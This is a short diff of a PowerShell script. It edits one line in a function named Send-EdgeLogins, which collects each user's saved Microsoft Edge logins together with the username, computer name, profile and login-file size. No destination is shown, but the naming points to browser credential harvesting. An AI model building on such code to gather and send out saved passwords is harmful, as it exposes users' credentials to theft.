@@ -11,7 +11,7 @@ function Send-EdgeLogins {
         [pscustomobject]@{
             UserName = $_.username
             ComputerName = $env:COMPUTERNAME
-            Logins = @(Get-EdgeLogins -LoginDataFile $_.EdgeLoginDatapath)
+            Logins = (Get-EdgeLogins -LoginDataFile $_.EdgeLoginDatapath)
             ProfileName = $_.ProfileName
             FileSize = (Get-Item $_.EdgeLoginDatapath | Select-Object -ExpandProperty Length)
         }
